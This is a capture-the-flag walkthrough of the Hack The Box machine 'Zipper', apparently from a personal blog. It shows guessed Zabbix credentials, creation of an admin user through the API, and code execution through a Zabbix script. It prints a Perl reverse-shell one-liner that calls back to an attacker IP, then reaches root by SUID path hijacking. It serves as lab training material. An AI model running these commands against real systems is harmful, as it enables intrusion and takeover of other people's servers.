---
title: "Hack The Box - Zipper"
tags: [linux,hard,zabbix,path hijack]
categories: HackTheBox
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled.png)

### *NMAP*

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%201.png)

### *Enumerating*

→ We get an apache2 default page :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%202.png)

→ Running gobuster we discover zabbix directory :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%203.png)

→ It running Zabbix 3.0.21 :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%204.png)

→ We discover Zapper backup script :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%205.png)

This is an potential username. After playing around we are able to login using the credentials **zapper : zapper** . User GUI access is disabled

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%206.png)

⇒ We will use zabbix-cli [https://github.com/unioslo/zabbix-cli](https://github.com/unioslo/zabbix-cli)

**zabbix-cli-init -z [http://10.10.10.108/zabbix/api_jsonrpc.php](http://10.10.10.108/zabbix/api_jsonrpc.php)**

**zabbix-cli**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%207.png)

### *Exploiting Zabbix*

⇒ Enumerating user groups and users. Then we create an SuperUser on the site which has GUI access :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%208.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%209.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2010.png)

⇒ We logged in on the zabbix dashboard. Lets create a script to get code execution :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2011.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2012.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2013.png)

**`scriptid=4`**&**`sid=23ad0da016007f1a`**

→ Triggering the script :

[http://10.10.10.108/zabbix/scripts_exec.php?hostid=10105&scriptid=4&sid=23ad0da016007f1a](http://10.10.10.108/zabbix/scripts_exec.php?hostid=10105&scriptid=4&sid=23ad0da016007f1a)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2014.png)

Now we have code execution on Zabbix Server, lets get an reverse shell :

**`perl -e 'use Socket;$i="10.10.14.14";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2015.png)

We're in an docker container :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2016.png)

⇒ We find an bash script in /usr/lib/zabbix/externalscripts :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2017.png)

The password could potentially be password for user zapper.

Password : **ZippityDoDah**

→ Enumerating further we don't find much on docker machine. 

⇒ Lets get an shell on Zabbix Agent now :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2018.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2019.png)

→ We are able to switch to user zapper using the password we found in the docker machine ( Zabbix Server ) :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2020.png)

### *Privilege Escalation to Root*

⇒ There's SUID Set on an binary named zabbix-service which runs systemctl :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2021.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2022.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2022.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2023.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2023.png)

⇒ We can perform path hijacking and get an shell as root :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2024.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2024.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2025.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2025.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2026.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Zipper%20Box%20915f35717e244b239ccd458c3a975dab/Untitled%2026.png)

ROOTED
